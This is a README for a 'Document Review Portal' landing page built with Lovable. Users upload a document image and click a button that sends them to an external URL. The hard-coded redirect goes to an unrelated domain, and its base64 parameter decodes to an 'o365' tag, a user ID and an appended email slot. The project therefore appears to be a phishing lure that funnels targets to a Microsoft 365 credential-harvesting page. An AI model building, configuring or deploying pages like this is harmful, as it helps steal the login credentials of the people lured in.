
# Document Review Portal

A clean, responsive landing page that allows users to upload and review documents.

## Features

- **Image Upload**: Upload document images via drag-and-drop or file selector
- **Review Button**: Redirects users to a configurable external document processing system
- **Responsive Design**: Works on mobile, tablet, and desktop devices
- **Clean UI**: Modern, professional interface

## Configuration

To change the redirect URL when users click "Review Document", modify the `redirectUrl` variable in `src/pages/Index.tsx`:

```typescript
// CONFIGURE YOUR REDIRECT URL HERE
// This is the URL users will be redirected to when clicking "Review Document"
const redirectUrl = "https://yourinternetbusinesssoftware.com/n/?c3Y9bzM2NV8xX25vbSZyYW5kPVVuTjBWMm89JnVpZD1VU0VSMTEwMzIwMjVVNDgwMzExNTY=N0123N[EMAIL]";
```

## Custom Domain Setup

To connect a custom domain to this project:

1. Navigate to Project > Settings > Domains in the Lovable dashboard
2. Click "Connect Domain" and follow the instructions
3. For more information, see the [custom domain setup guide](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)

## Development

To run this project locally:

```bash
# Install dependencies
npm install

# Start development server
npm run dev
```

## Deployment

This project is automatically deployed through Lovable. To publish updates:

1. Open the [Lovable Project](https://lovable.dev/projects/d7772823-8df5-4d59-b647-425790344de8)
2. Click on Share -> Publish
